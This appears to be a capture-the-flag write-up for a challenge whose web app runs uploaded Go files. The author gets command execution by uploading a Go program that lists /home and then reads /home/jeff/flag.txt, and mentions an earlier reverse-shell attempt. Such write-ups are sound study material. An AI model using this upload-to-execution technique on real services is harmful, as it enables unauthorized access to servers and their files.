``` 
A web app for those who are too lazy to SSH in.

http://web1.cybercastors.com:14437

Author: icinta

```
Navigating to the web site and Here we can upload .go files so as the title of the chall indicates Shortcuts ! i figured out that when u upload a file  the
server will try to execute this command ```go run your_file.go```  So i tried to upload my go file to see if i can run some commands to get the flag location and read it ! 
well first i uploaded a reverse shell but the admin directly deleted it and updated the firewall :laughing: :laughing: so i uploaded this code now as k.go and k 
``` 
package main

import (
    "fmt"
    "os/exec"
    )

func main() {

    fmt.Println("Program Output")
    out, err := exec.Command("ls", "/home/").Output()
    if err != nil {
        fmt.Printf("%s", err)
    }
    output := string(out[:])
    fmt.Println(output)
    fmt.Println("Program Complete")
}    
```
it works ! perfect ! now discovering the we have a Jeff Directory in /home/ , i entred there and found the flag.txt and i read it , i just changed 
```
out, err := exec.Command("cat", "/home/jeff/flag.txt").Output()
```
And yes ! we got Our  flag  :innocent:	
